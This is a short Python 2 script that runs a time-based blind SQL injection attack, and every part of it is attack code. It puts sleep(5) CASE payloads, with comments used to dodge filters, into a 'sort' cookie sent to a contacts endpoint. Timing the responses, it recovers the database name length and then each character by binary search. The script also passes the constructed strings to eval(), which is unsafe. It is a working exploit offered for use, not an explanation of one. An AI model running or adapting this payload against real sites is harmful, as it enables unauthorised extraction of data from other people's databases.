#! /usr/bin/python
 
 
import requests
import time
from string import ascii_letters, digits
from random import choice
 
url = 'https://abc.com/accounts/1130092039535/contacts/?'
 
sso_string = 'chuoisession'
 
cookie_len_string = "{'sort': 'name%%20asc%%2c(select/**/case/**/when/**/(length(database())>=%d)/**/then/**/sleep(5)/**/else/**/1/**/end)#%s', 'sso_so': '"+sso_string+"'}"
 
result = []
 
def request_url(url, cookies):
    r = requests.get(url,cookies=cookies)
 
def exploit_payload(url,cookies):
    start = time.time()
    request_url(url,cookies)
    end = time.time() - start
    return end
 
def get_result(url,cc_string):
    low = 32
    high = 126
    while (low != high):
        junk = ''.join([choice(ascii_letters+digits)for i in range(10)])
        mid = (low + high)/2
        s_f_cookies = cc_string % (mid,junk)
        print s_f_cookies
        f_cookies = eval(s_f_cookies)
        if (exploit_payload(url,f_cookies) > 5):
            low = mid + 1
        else:
            high = mid
    return high
 
x = 1
len = 0
 
while True:
    junk = ''.join([choice(ascii_letters+digits)for i in range(10)])
    cookie_temp_string = cookie_len_string % (x,junk)
    print cookie_temp_string
    f_cookies = eval(cookie_temp_string)
    t = exploit_payload(url,f_cookies)
    if t < 5:
        len = x - 1
        break
    x = x + 1
 
for i in range(len):
    i += 1
    s1 = 'mid(database()%%2c'+str(i)+'%%2c1)'
    s2 = "{'sort': 'name%%20asc%%2c(select/**/case/**/when/**/(" + s1 + ">char(%s))/**/then/**/sleep(5)/**/else/**/1/**/end)#%s', 'sso_so': '"+sso_string+"'}"
    result.append(get_result(url,s2))
 
r = ''.join([chr(i) for i in result])
print 'Database: ' + r
